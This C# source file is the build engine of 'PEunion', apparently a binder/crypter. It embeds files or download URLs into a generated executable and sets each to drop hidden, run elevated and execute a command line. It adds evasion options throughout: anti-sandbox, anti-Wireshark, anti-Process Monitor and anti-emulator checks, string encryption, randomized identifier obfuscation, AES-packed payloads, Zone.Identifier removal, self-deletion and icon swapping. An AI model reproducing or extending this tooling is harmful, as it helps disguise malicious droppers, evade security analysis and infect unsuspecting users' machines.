using BytecodeApi;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace PEunion
{
	public static class Builder
	{
		public static Task<CompilerResults> BuildAsync(string path, Project project) => Task.Factory.StartNew(() => Build(path, project));
		public static Task<string> BuildCodeAsync(Project project) => Task.Factory.StartNew(() => BuildCode(project));

		public static CompilerResults Build(string path, Project project)
		{
			string code = BuildCode(project);

			WindowMain.Singleton.OverlayTitle = "Compiling '" + Path.GetFileName(path) + "'";
			WindowMain.Singleton.OverlayIsIndeterminate = true;
			string manifestPath = null;

			try
			{
				bool isManifestResource;
				manifestPath = Path.GetTempFileName();
				byte[] manifestFile;
				switch (project.Manifest)
				{
					case BuildManifest.None:
						manifestFile = Properties.Resources.FileManifestNone;
						isManifestResource = true;
						break;
					case BuildManifest.AsInvoker:
						manifestFile = Properties.Resources.FileManifestAsInvoker;
						isManifestResource = false;
						break;
					case BuildManifest.RequireAdministrator:
						manifestFile = Properties.Resources.FileManifestRequireAdministrator;
						isManifestResource = false;
						break;
					default:
						throw new InvalidOperationException();
				}
				File.WriteAllBytes(manifestPath, manifestFile);

				using (CSharpCodeProvider provider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }))
				{
					string platformName;
					switch (project.Platform)
					{
						case BuildPlatform.Win32:
							platformName = "x86";
							break;
						case BuildPlatform.Win64:
							platformName = "x64";
							break;
						case BuildPlatform.AnyCPU:
							platformName = "anycpu";
							break;
						default:
							throw new InvalidOperationException();
					}

					CompilerParameters parameters = new CompilerParameters
					{
						GenerateExecutable = true,
						GenerateInMemory = true,
						OutputAssembly = path,
						CompilerOptions = "/nostdlib /target:winexe /platform:" + platformName + (isManifestResource ? null : " /win32manifest:" + manifestPath),
						Win32Resource = isManifestResource ? manifestPath : null
					};

					parameters.ReferencedAssemblies.AddRange(new[]
					{
						"mscorlib.dll",
						"System.dll",
						"System.Core.dll",
						"System.Windows.Forms.dll"
					});

					CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

					if (results.Errors.Count == 0 && project.IconPath != null)
					{
						WindowMain.Singleton.OverlayTitle = "Applying icon '" + Path.GetFileName(project.IconPath) + "'";
						new FileInfo(path).ChangeExecutableIcon(project.IconPath);
					}
					return results;
				}
			}
			finally
			{
				if (manifestPath != null) File.Delete(manifestPath);
			}
		}
		public static string BuildCode(Project project)
		{
			WindowMain.Singleton.OverlayTitle = "Packing files...";
			WindowMain.Singleton.OverlayIsIndeterminate = false;
			WindowMain.Singleton.OverlayProgress = 0;

			long totalSize = project.FileItems.Sum(file => new FileInfo(file.FullName).Length);
			long progress = 0;

			StringBuilder itemsPart = new StringBuilder();
			Dictionary<string, StringBuilder> codeBlocks = new Dictionary<string, StringBuilder>();

			foreach (ProjectItem item in project.Items)
			{
				if (item is ProjectFile file)
				{
					WindowMain.Singleton.OverlayTitle = "Packing '" + file.Name + "'";
					itemsPart.AppendLine("\t\tnew __FileItem__ // File");
					itemsPart.AppendLine("\t\t{");
					itemsPart.AppendLine("\t\t\t__C1_FileName__ = " + CreateStringLiteral(file.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(file.Name.Trim()));
					itemsPart.AppendLine("\t\t\t__C1_Compress__ = " + (file.Compress ? "true" : "false") + ", // Compress");
					itemsPart.AppendLine("\t\t\t__C1_Encrypt__ = " + (file.Encrypt ? "true" : "false") + ", // Encrypt");
					itemsPart.AppendLine("\t\t\t__C1_Hidden__ = " + (file.Hidden ? "true" : "false") + ", // Hidden");
					itemsPart.AppendLine("\t\t\t__C1_DropLocation__ = " + file.DropLocation + ", // DropLocation");
					itemsPart.AppendLine("\t\t\t__C1_DropAction__ = " + file.DropAction + ", // DropAction");
					itemsPart.AppendLine("\t\t\t__C1_Runas__ = " + (file.Runas ? "true" : "false") + ", // Runas");
					itemsPart.AppendLine("\t\t\t__C1_CommandLine__ = " + CreateStringLiteral(file.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(file.CommandLine?.Trim()));
					itemsPart.AppendLine("\t\t\t__C1_AntiSandboxie__ = " + (file.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
					itemsPart.AppendLine("\t\t\t__C1_AntiWireshark__ = " + (file.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
					itemsPart.AppendLine("\t\t\t__C1_AntiProcessMonitor__ = " + (file.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
					itemsPart.AppendLine("\t\t\t__C1_AntiEmulator__ = " + (file.AntiEmulator ? "true" : "false") + ", // AntiEmulator");
					itemsPart.AppendLine("\t\t\t__C1_Content__ = new byte[] // Content");
					itemsPart.AppendLine("\t\t\t{");

					string blockName = "@@BLock" + codeBlocks.Count;
					StringBuilder block = new StringBuilder();
					codeBlocks.Add(blockName, block);
					itemsPart.Append(blockName);

					byte[] data = File.ReadAllBytes(file.FullName);
					if (file.Compress) data = Compress(data);
					if (file.Encrypt) data = Encrypt(data);

					foreach (IEnumerable<byte> chunk in data.Chunk(1024))
					{
						byte[] line = chunk.ToArray();
						block.AppendLine("\t\t\t\t" + line.Select(b => "0x" + b.ToString("x2") + ", ").CreateString().Trim());
						progress += line.Length;
						WindowMain.Singleton.OverlayProgress = progress * 100 / totalSize;
					}

					itemsPart.AppendLine("\t\t\t}");
				}
				else if (item is ProjectUrl url)
				{
					WindowMain.Singleton.OverlayTitle = "Packing URL...";
					itemsPart.AppendLine("\t\tnew __UrlItem__ // URL");
					itemsPart.AppendLine("\t\t{");
					itemsPart.AppendLine("\t\t\t__C2_Url__ = " + CreateStringLiteral(url.Url.Trim(), project.StringEncryption) + ", // Url: " + CreateCommentLiteral(url.Url.Trim()));
					itemsPart.AppendLine("\t\t\t__C2_FileName__ = " + CreateStringLiteral(url.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(url.Name.Trim()));
					itemsPart.AppendLine("\t\t\t__C2_Hidden__ = " + (url.Hidden ? "true" : "false") + ", // Hidden");
					itemsPart.AppendLine("\t\t\t__C2_DropLocation__ = " + url.DropLocation + ", // DropLocation");
					itemsPart.AppendLine("\t\t\t__C2_DropAction__ = " + url.DropAction + ", // DropAction");
					itemsPart.AppendLine("\t\t\t__C2_Runas__ = " + (url.Runas ? "true" : "false") + ", // Runas");
					itemsPart.AppendLine("\t\t\t__C2_CommandLine__ = " + CreateStringLiteral(url.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(url.CommandLine?.Trim()));
					itemsPart.AppendLine("\t\t\t__C2_AntiSandboxie__ = " + (url.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
					itemsPart.AppendLine("\t\t\t__C2_AntiWireshark__ = " + (url.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
					itemsPart.AppendLine("\t\t\t__C2_AntiProcessMonitor__ = " + (url.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
					itemsPart.AppendLine("\t\t\t__C2_AntiEmulator__ = " + (url.AntiEmulator ? "true" : "false") + ", // AntiEmulator");
				}
				else if (item is ProjectMessageBox messageBox)
				{
					WindowMain.Singleton.OverlayTitle = "Packing Message Box...";
					itemsPart.AppendLine("\t\tnew __MessageBoxItem__ // MessageBox");
					itemsPart.AppendLine("\t\t{");
					itemsPart.AppendLine("\t\t\t__C3_Title__ = " + CreateStringLiteral(messageBox.Title, project.StringEncryption) + ", // Title: " + CreateCommentLiteral(messageBox.Title));
					itemsPart.AppendLine("\t\t\t__C3_Text__ = " + CreateStringLiteral(messageBox.Text, project.StringEncryption) + ", // Text: " + CreateCommentLiteral(messageBox.Text));
					itemsPart.AppendLine("\t\t\t__C3_Buttons__ = MessageBoxButtons." + messageBox.Buttons + ", // Buttons");
					itemsPart.AppendLine("\t\t\t__C3_Icon__ = MessageBoxIcon." + messageBox.Icon + ", // Icon");
				}
				else
				{
					throw new InvalidOperationException();
				}

				itemsPart.AppendLine("\t\t}" + (item == project.Items.Last() ? null : ","));
			}

			WindowMain.Singleton.OverlayTitle = "String literal encryption...";
			WindowMain.Singleton.OverlayIsIndeterminate = true;

			string code = Properties.Resources.FileStub;

			new Regex(@"\/\*\*\/(""[^""]+"")")
				.Matches(code)
				.Cast<Match>()
				.Where(match => match.Success)
				.ForEach(match =>
				{
					string str = match.Groups[0].Value;
					string stringContent = str.SubstringFrom("\"").SubstringUntil("\"", true);
					code = code.Replace(str, CreateStringLiteral(stringContent, project.StringLiteralEncryption));
				});

			WindowMain.Singleton.OverlayTitle = "Preprocessor directives...";

			string codePreprocessorPart = new[]
			{
				(project.StringEncryption ? null : "//") + "#define ENABLE_STRINGENCRYPTION",
				(project.StringLiteralEncryption ? null : "//") + "#define ENABLE_STRINGLITERALENCRYPTION",
				(project.DeleteZoneID ? null : "//") + "#define ENABLE_DELETEZONEID",
				(project.Melt ? null : "//") + "#define ENABLE_MELT",
				(project.FileItems.Any(file => file.Compress) ? null : "//") + "#define ENABLE_COMPRESSION",
				(project.FileItems.Any(file => file.Encrypt) ? null : "//") + "#define ENABLE_ENCRYPTION",
				(project.FileItems.Any(file => file.AntiSandboxie) || project.UrlItems.Any(file => file.AntiSandboxie) ? null : "//") + "#define ENABLE_ANTI_SANDBOXIE",
				(project.FileItems.Any(file => file.AntiWireshark) || project.UrlItems.Any(file => file.AntiWireshark) ? null : "//") + "#define ENABLE_ANTI_WIRESHARK",
				(project.FileItems.Any(file => file.AntiProcessMonitor) || project.UrlItems.Any(file => file.AntiProcessMonitor) ? null : "//") + "#define ENABLE_ANTI_PROCESSMONITOR",
				(project.FileItems.Any(file => file.AntiEmulator) || project.UrlItems.Any(file => file.AntiEmulator) ? null : "//") + "#define ENABLE_ANTI_EMULATOR",
			}.ToMultilineString();

			string assemblyInfoPart;
			if (new[] { project.AssemblyTitle, project.AssemblyProduct, project.AssemblyCopyright, project.AssemblyVersion }.Any(str => !str.IsNullOrEmpty()))
			{
				assemblyInfoPart = "\r\n";
				if (!project.AssemblyTitle.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyTitle(\"" + project.AssemblyTitle + "\")]\r\n";
				if (!project.AssemblyProduct.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyProduct(\"" + project.AssemblyProduct + "\")]\r\n";
				if (!project.AssemblyVersion.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyVersion(\"" + project.AssemblyVersion + "\")]\r\n";
				if (!project.AssemblyCopyright.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyCopyright(\"" + project.AssemblyCopyright + "\")]\r\n";
			}
			else
			{
				assemblyInfoPart = "";
			}

			code = code
				.Replace("/*{ASSEMBLYINFO}*/", assemblyInfoPart)
				.Replace("/*{PREPROCESSOR}*/", codePreprocessorPart)
				.Replace("/*{ITEMS}*/", itemsPart.ToString());

			WindowMain.Singleton.OverlayTitle = "Obfuscation...";

			new Regex("__[a-zA-Z0-9_]+__")
				.Matches(code)
				.Cast<Match>()
				.Where(match => match.Success)
				.Select(match => match.Value)
				.ForEach(variable => code = code.Replace(variable, GenerateVariableName(variable, project.Obfuscation)));

			WindowMain.Singleton.OverlayTitle = "Merging code...";

			codeBlocks.ForEach(codeBlock => code = code.Replace(codeBlock.Key, codeBlock.Value.ToString()));

			return code.TrimStart();
		}

		private static string GenerateVariableName(string originalVariableName, BuildObfuscationType obfuscation)
		{
			const string specialCharacters = "각갂갃간갅갆갇갈갉갊갋갌갍갎갏감갑값갓갔강갖갗갘같갚갛개객갞갟갠갡갢갣갤갥갦갧갨갩갪갫갬갭갮갯";

			switch (obfuscation)
			{
				case BuildObfuscationType.None:
					return originalVariableName
						.TrimEnd("__")
						.SubstringFrom("_", true);
				case BuildObfuscationType.AlphaNumeric:
					string alphabet = TextResources.Alphabet + TextResources.Alphabet.ToUpper();
					string alphabetWithNumbers = alphabet + "0123456789";

					return Enumerable
						.Range(0, MathEx.Random.Next(10, 20))
						.Select(i => MathEx.Random.NextObject((i == 0 ? alphabet : alphabetWithNumbers).ToCharArray()))
						.CreateString();
				case BuildObfuscationType.Special:
					return Enumerable
						.Range(0, MathEx.Random.Next(10, 20))
						.Select(i => MathEx.Random.NextObject(specialCharacters.ToCharArray()))
						.CreateString();
				default:
					throw new InvalidOperationException();
			}
		}
		private static byte[] Compress(byte[] data)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(data);
				}
				return BitConverter.GetBytes(data.Length).Concat(memoryStream.ToArray());
			}
		}
		private static byte[] Encrypt(byte[] data)
		{
			byte[] key = MathEx.RandomNumberGenerator.GetBytes(16);

			using (MemoryStream memoryStream = new MemoryStream())
			{
				memoryStream.Write(key);
				Rijndael aes = Rijndael.Create();
				aes.IV = aes.Key = key;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(data, 0, data.Length);
				}
				return memoryStream.ToArray();
			}
		}
		private static string CreateStringLiteral(string str, bool encrypt)
		{
			str = str ?? "";

			if (encrypt)
			{
				str = str.Replace(@"\\", @"\").Replace("\\\"", "\"");
				byte key = MathEx.Random.NextByte();
				return "__F_DecryptString__(\"\\x" + key.ToString("x") + str.Select(c => @"\x" + (c ^ key).ToString("x")).CreateString() + "\")";
			}
			else
			{
				return "\"" + str.Replace("\"", "\\\"").Replace("\r", @"\r").Replace("\n", @"\n") + "\"";
			}
		}
		private static string CreateCommentLiteral(string str)
		{
			return str?.Replace("\r", @"\r").Replace("\n", @"\n") ?? "";
		}
	}
}